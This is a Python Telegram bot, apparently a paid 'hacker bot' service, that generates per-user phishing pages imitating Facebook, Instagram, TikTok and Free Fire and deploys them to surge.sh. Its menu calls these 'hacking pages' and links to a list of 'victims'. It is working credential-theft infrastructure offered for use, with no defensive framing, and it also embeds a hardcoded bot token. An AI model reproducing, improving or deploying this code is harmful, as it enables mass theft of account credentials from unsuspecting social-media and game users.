import os
import time
import subprocess
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler

# توكن البوت
TOKEN = '7428814157:AAE_cpFTNAeOskpX5x066ht6dqlgdjP7xPo'

# ملفات الأكواد وملفات المستخدمين
CODES_FILE = 'imad.txt'
USER_CODES_FILE = 'user_codes.txt'

# دالة لبدء البوت
def start(update, context):
    user_id = update.message.chat_id
    user_code_info = get_user_code(user_id)

    if user_code_info and is_code_valid(user_code_info['time']):
        update.message.reply_text("مرحبًا بك مجددًا في بوت الهكر IMAD-213.")
        show_choice_buttons(update.message.chat_id, context)
    else:
        update.message.reply_text("مرحبًا بك في بوت الهكر IMAD-213، يرجى إدخال الكود الخاص بك:")
        context.user_data['waiting_for_code'] = True

# دالة للتحقق من الكود المدخل
def check_code(update, context):
    if context.user_data.get('waiting_for_code', False):
        user_code = update.message.text.strip()

        if user_code in get_codes_from_file():
            save_user_code(update.message.chat_id, user_code)
            remove_code_from_file(user_code)
            update.message.reply_text(f"تم حفظ الكود الخاص بك: {user_code}. يمكنك الآن استخدام البوت لمدة 24 ساعة.")
            show_choice_buttons(update.message.chat_id, context)
            context.user_data['waiting_for_code'] = False
        else:
            update.message.reply_text("الكود غير صحيح. يرجى إدخال كود صحيح.")

# دالة للحصول على الأكواد من ملف imad.txt
def get_codes_from_file():
    if os.path.exists(CODES_FILE):
        with open(CODES_FILE, 'r') as file:
            return [line.strip() for line in file.readlines()]
    return []

# دالة لحفظ اسم المستخدم والكود في ملف
def save_user_code(user_id, user_code):
    with open(USER_CODES_FILE, 'a') as file:
        file.write(f"{user_id}:{user_code}:{time.time()}\n")

# دالة لحذف الكود من ملف الأكواد
def remove_code_from_file(code):
    lines = []
    if os.path.exists(CODES_FILE):
        with open(CODES_FILE, 'r') as file:
            lines = file.readlines()

        with open(CODES_FILE, 'w') as file:
            for line in lines:
                if line.strip() != code:
                    file.write(line)

# دالة للحصول على معلومات الكود الخاص بالمستخدم
def get_user_code(user_id):
    if os.path.exists(USER_CODES_FILE):
        with open(USER_CODES_FILE, 'r') as file:
            for line in file:
                uid, code, timestamp = line.strip().split(':')
                if int(uid) == user_id:
                    return {'code': code, 'time': float(timestamp)}
    return None

# دالة للتحقق مما إذا كانت صلاحية الكود لا تزال سارية
def is_code_valid(timestamp):
    elapsed_time = time.time() - timestamp
    return elapsed_time < 86400

# دالة لعرض زرين فقط بعد إدخال الكود بنجاح أو عند الضغط على "Start"
def show_choice_buttons(chat_id, context):
    keyboard = [
        [InlineKeyboardButton("عرض الأزرار", callback_data='show_buttons')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    context.bot.send_message(chat_id=chat_id, text="اختر خيارًا:", reply_markup=reply_markup)

# دالة لعرض الأزرار بعد اختيار "عرض الأزرار"
def show_buttons(update, context):
    chat_id = update.callback_query.message.chat_id
    keyboard = [
        [InlineKeyboardButton("FACEBOOK 📘", callback_data='facebook_button'),
         InlineKeyboardButton("INSTAGRAM 📷", callback_data='instagram_button')],
        [InlineKeyboardButton("🔴FREE FIRE", callback_data='freefire_button'),
         InlineKeyboardButton("TIK TOK 🎵", callback_data='tiktok_button')],
        [InlineKeyboardButton("الضحايا الموجودين", url="https://t.me/algeria_213_bot")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    context.bot.send_message(chat_id=chat_id, text="صفحات الاختراق: IMAD-213", reply_markup=reply_markup)

# دالة لمعالجة الضغط على زر FACEBOOK
def handle_facebook_button(update, context):
    process_button_click(update, context, 'facebook')

# دالة لمعالجة الضغط على زر INSTAGRAM
def handle_instagram_button(update, context):
    process_button_click(update, context, 'instagram')

# دالة لمعالجة الضغط على زر FREE FIRE
def handle_freefire_button(update, context):
    process_button_click(update, context, 'freefire')

# دالة لمعالجة الضغط على زر TIK TOK
def handle_tiktok_button(update, context):
    process_button_click(update, context, 'tiktok')

# دالة لمعالجة ضغط الأزرار بشكل موحد
def process_button_click(update, context, platform):
    chat_id = update.callback_query.message.chat_id
    user_id = chat_id

    user_folder = f"{platform}_{user_id}"
    os.makedirs(user_folder, exist_ok=True)

    modified_file_path = os.path.join(user_folder, 'index.html')

    # تحقق مما إذا كان الملف قد تم إنشاؤه مسبقًا
    if os.path.exists(modified_file_path):
        surge_url = f"https://{platform}_{user_id}.surge.sh"
        context.bot.send_message(chat_id=chat_id, text=f"لقد تم إنشاء صفحة {platform.upper()} مسبقًا! يمكنك الوصول إليها من هنا: {surge_url}")
    else:
        original_file_path = os.path.join(platform, 'index.html')
        modify_index_file(original_file_path, modified_file_path, str(user_id))
        surge_url = upload_folder_to_surge(user_folder, f"{platform}_{user_id}")
        context.bot.send_message(chat_id=chat_id, text=f"تم رفع صفحة {platform.upper()} بنجاح! يمكنك الوصول إليها من هنا: {surge_url}")

    show_choice_buttons(chat_id, context)

# دالة لتعديل ملف index.html
def modify_index_file(original_file_path, new_file_path, user_id):
    if os.path.exists(original_file_path):
        with open(original_file_path, 'r') as file:
            content = file.read()
        modified_content = content.replace("imad27", user_id)
        with open(new_file_path, 'w') as file:
            file.write(modified_content)

# دالة لرفع المجلد إلى surge
def upload_folder_to_surge(folder_path, folder_name):
    command = f'surge {folder_path} {folder_name}.surge.sh'
    subprocess.run(command, shell=True)
    return f"https://{folder_name}.surge.sh"

# دالة لمعالجة ردود الأفعال على الأزرار
def button_handler(update, context):
    query = update.callback_query
    query.answer()

    if query.data == 'show_buttons':
        show_buttons(update, context)
    elif query.data == 'facebook_button':
        handle_facebook_button(update, context)
    elif query.data == 'instagram_button':
        handle_instagram_button(update, context)
    elif query.data == 'freefire_button':
        handle_freefire_button(update, context)
    elif query.data == 'tiktok_button':
        handle_tiktok_button(update, context)

# إعداد الـ Updater
def main():
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, check_code))
    dp.add_handler(CallbackQueryHandler(button_handler))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
